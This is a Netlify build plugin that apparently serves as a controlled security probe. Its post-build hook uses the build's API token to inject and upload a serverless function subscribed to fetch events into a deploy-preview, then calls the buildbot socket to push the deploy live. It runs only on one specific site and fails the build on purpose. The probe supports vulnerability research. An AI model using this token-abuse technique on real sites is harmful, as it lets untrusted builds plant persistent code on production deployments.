import { createHash } from 'node:crypto'
import { readFileSync, readdirSync } from 'node:fs'
import { createConnection } from 'node:net'
import { isAbsolute, relative, resolve } from 'node:path'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const FUNCTION_NAME = 'aaa-preempt-canary'

const findBuildbotSocket = () => {
  try {
    const paths = readFileSync('/proc/net/unix', 'utf8')
      .split('\n')
      .slice(1)
      .filter(Boolean)
      .map((line) => line.trim().split(/\s+/)[7])
      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
    return paths.length === 1 ? paths[0] : null
  } catch {
    return null
  }
}

const requestEarlyDeploy = (deployDir) =>
  new Promise((resolveRequest) => {
    const socketPath = findBuildbotSocket()
    const result = {
      socketFound: Boolean(socketPath),
      connected: false,
      requestWritten: false,
      responseReceived: false,
      responseSucceeded: false,
      timedOut: false,
    }

    if (!socketPath) {
      resolveRequest(result)
      return
    }

    let response = ''
    let settled = false
    const client = createConnection({ path: socketPath })
    const finish = () => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      client.destroy()
      let parsed
      try {
        parsed = JSON.parse(response)
      } catch {}
      result.responseWasJson = parsed !== undefined
      result.responseSucceeded = parsed?.succeeded === true
      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
        ? parsed.values.error_type
        : null
      resolveRequest(result)
    }
    const timer = setTimeout(() => {
      result.timedOut = true
      finish()
    }, 90_000)

    client.once('connect', () => {
      result.connected = true
      client.write(JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }), (error) => {
        result.requestWritten = !error
        if (error) finish()
      })
    })
    client.on('data', (chunk) => {
      result.responseReceived = true
      response += chunk.toString('utf8').slice(0, 8_192)
      finish()
    })
    client.once('error', finish)
    client.once('close', finish)
  })

const callJson = async ({ body, method, token, url }) => {
  try {
    const response = await fetch(url, {
      method,
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/json',
      },
      body: JSON.stringify(body),
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    let responseBody = null
    try {
      responseBody = await response.json()
    } catch {}
    return {
      status: response.status,
      ok: response.ok,
      requiredFunctionCount: Array.isArray(responseBody?.required_functions)
        ? responseBody.required_functions.length
        : null,
      state: ['new', 'pending_review', 'accepted', 'enqueued', 'building', 'uploading', 'uploaded', 'preparing', 'prepared', 'processing', 'processed', 'ready', 'error', 'retrying'].includes(responseBody?.state)
        ? responseBody.state
        : null,
    }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const uploadFunction = async ({ apiBase, bundle, deployId, token }) => {
  try {
    const url = new URL(`/api/v1/deploys/${deployId}/functions/${FUNCTION_NAME}`, apiBase)
    url.searchParams.set('runtime', 'js')
    url.searchParams.set('size', String(bundle.length))
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/octet-stream',
      },
      body: bundle,
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    return { status: response.status, ok: response.ok }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const readPolicy = async ({ token, apiBase }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return { status: response.status, untrustedFlow: body?.build_settings?.untrusted_flow || null }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const findFunctionBundle = (functionsDist) => {
  const exactName = `${FUNCTION_NAME}.zip`
  try {
    return readdirSync(functionsDist).includes(exactName) ? resolve(functionsDist, exactName) : null
  } catch {
    return null
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const repositoryRoot = resolve(process.cwd())
  const functionsDist = resolve(constants.FUNCTIONS_DIST || '')
  const deployDir = relative(repositoryRoot, publishDir) || '.'
  const deployId = process.env.DEPLOY_ID || ''
  const token = constants.NETLIFY_API_TOKEN
  const apiBase = /^https?:\/\//i.test(constants.NETLIFY_API_HOST || '')
    ? constants.NETLIFY_API_HOST
    : `https://${constants.NETLIFY_API_HOST || 'api.netlify.com'}`
  const bundlePath = findFunctionBundle(functionsDist)
  const policy = typeof token === 'string' && token.length > 0 ? await readPolicy({ token, apiBase }) : null
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: process.env.REVIEW_ID === '1',
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    deployIdPresent: /^[0-9a-f]{24}$/.test(deployId),
    tokenPresent: typeof token === 'string' && token.length > 0,
    publishInsideRepository: !isAbsolute(deployDir) && !deployDir.startsWith('..'),
    functionBundlePresent: bundlePath !== null,
  }
  const result = {
    schema: 'netlify-build-token-function-injection.v1',
    prerequisites,
    policy,
    attempted: false,
    credentialValuesLogged: false,
    functionBodyContainsSecretMaterial: false,
    syntheticOnly: true,
  }

  if (!Object.values(prerequisites).every(Boolean)) {
    console.log(`NETLIFY_BUILD_TOKEN_FUNCTION_INJECTION ${JSON.stringify(result)}`)
    return
  }

  result.attempted = true
  const bundle = readFileSync(bundlePath)
  const bundleHash = createHash('sha256').update(bundle).digest('hex')
  result.bundleSizePositive = bundle.length > 0
  result.bundleHashShapeValid = /^[0-9a-f]{64}$/.test(bundleHash)

  result.declare = await callJson({
    method: 'PUT',
    token,
    url: new URL(`/api/v1/sites/${EXPECTED_SITE_ID}/deploys/${deployId}`, apiBase),
    body: {
      files: {},
      functions: { [FUNCTION_NAME]: bundleHash },
      function_schedules: [],
      functions_config: {
        [FUNCTION_NAME]: {
          event_subscriptions: ['fetch', 'deploy_succeeded'],
        },
      },
    },
  })
  result.upload = await uploadFunction({ apiBase, bundle, deployId, token })

  if (result.declare.ok && result.upload.ok) {
    result.deploy = await requestEarlyDeploy(deployDir)
  }

  result.controlledFailureRequested = true
  console.log(`NETLIFY_BUILD_TOKEN_FUNCTION_INJECTION ${JSON.stringify(result)}`)
  utils.build.failBuild('Controlled failure after build-token function injection boundary probe')
}
